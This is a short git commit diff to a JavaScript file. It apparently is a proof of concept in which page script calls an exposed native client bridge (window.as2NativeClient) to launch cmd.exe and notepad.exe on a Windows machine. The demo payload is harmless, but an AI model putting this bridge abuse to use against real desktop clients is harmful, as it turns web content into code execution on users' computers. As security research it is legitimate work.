dafe9af46593e682e436d47b467d83c3d7a2dc6a
Rakesh Mane <rakeshmane12345@gmail.com>
2020-07-09 21:26:04 +0530

    Update tmp1.js

--- tmp1.js
+++ tmp1.js
@@ -5,9 +5,9 @@
                   
             
             window.as2NativeClient.redirectToHomeWithUrl("C:\\Windows\\System32\\cmd.exe");
-            window.as2NativeClient.redirectToHomeWithUrl("C:\\Windows\\System32\\notepad.exe");
+            //window.as2NativeClient.redirectToHomeWithUrl("C:\\Windows\\System32\\notepad.exe");
 
-                  
+                  window.as2NativeClient.Process.Start("C:\\Windows\\System32\\notepad.exe")
              
                   
           }
